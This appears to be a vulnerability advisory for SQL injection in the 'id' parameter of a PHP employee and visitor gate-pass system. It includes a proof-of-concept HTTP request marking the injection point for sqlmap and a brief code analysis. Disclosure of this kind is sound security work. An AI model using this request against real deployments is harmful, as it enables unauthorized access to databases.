## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
employee_gatepass/admin/?page=employee/view_employee

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via employee_gatepass/admin/?page=employee/view_employee, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
GET /employee_gatepass/admin/?page=employee/view_employee&id=2* HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name through sqlmap
<img width="941" alt="image" src="https://github.com/user-attachments/assets/032872dc-cad4-45fa-bf74-c2ae127045c7">



Get the database name: employee_gatepass_db
## code analysis:

The id parameter in Master.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

<img width="1358" alt="image" src="https://github.com/user-attachments/assets/9b623887-21c3-4100-9262-54dfbf3046bd">


 
